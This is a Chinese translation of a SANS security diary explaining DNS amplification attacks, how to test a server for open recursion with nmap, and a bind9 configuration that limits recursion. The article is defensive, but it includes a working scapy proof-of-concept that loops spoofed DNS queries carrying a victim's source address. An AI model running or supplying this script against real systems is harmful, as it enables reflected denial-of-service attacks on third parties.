# 测试DNS区域递归漏洞以及避免DNS放大攻击

阅读量 **211766**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-01-06 11:20:08

 **x**

##### 译文声明

本文是翻译文章，文章来源：360安全播报

原文地址：<https://isc.sans.edu/forums/diary/Testing+for+DNS+recursion+and+avoiding+being+part+of+DNS+amplification+attacks/20567/>

译文仅供参考，具体内容表达以及含义原文为准。

尽管专家提醒过很多次，但仍然有非常多的DNS服务器允许递归解析到外网的设备，这一点可以被用来进行DNS放大攻击。

  

那么怎样攻击呢？通常，攻击者使用僵尸网络向受害者的IP地址发送一个伪造的DNS请求，错误设置的DNS应答会使数据包被发送到受害者的IP地址，从而导致分布式拒绝服务攻击（DDoS）。

怎样测试你的DNS设备是否允许来自外部的递归解析呢？你可以使用这个叫dns-recursion 的nmap脚本：

如果它没有被启用，你只会得到一个开放端口的指示：

这个攻击是怎么运作的？我们来看下面的示意图：

攻击的POC可以很容易地用如下的scapy脚本被执行，由攻击者决定是否执行它：

    
    
    #!/usr/bin/python
    from scapy.all import *
    victimIP = raw_input("Please enter the IP address for the victim: ")
    dnsIP = raw_input("Please enter the IP address for the misconfigured DNS: ")
    while True:
            send(IP(dst=dnsIP,src=victimIP)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.google.com")),verbose=0)

我把这个脚本命名为dnscapy.py。当它执行时：

在受害者那边得到如下数据包：

怎样避免这种攻击呢？如果你正在使用bind9，那么把下面这些加入到全局选项。假设你的企业网络是10.1.1.0/24 和10.1.2.0/24：

    
    
    acl recursiononly { 10.1.1.0/24; 10.1.2.0/24; };
    options {
      allow-query { any; };
      allow-recursion { recursiononly; };
    };

本文翻译自360安全播报
[原文链接](https://isc.sans.edu/forums/diary/Testing+for+DNS+recursion+and+avoiding+being+part+of+DNS+amplification+attacks/20567/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Azuresky_AF** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/83245](/post/id/83245)

安全客 - 有思想的安全新媒体

本文转载自:
[360安全播报](https://isc.sans.edu/forums/diary/Testing+for+DNS+recursion+and+avoiding+being+part+of+DNS+amplification+attacks/20567/)

如若转载,请注明出处：
<https://isc.sans.edu/forums/diary/Testing+for+DNS+recursion+and+avoiding+being+part+of+DNS+amplification+attacks/20567/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __2赞

 __收藏

![](https://p5.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg)
Azuresky_AF

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

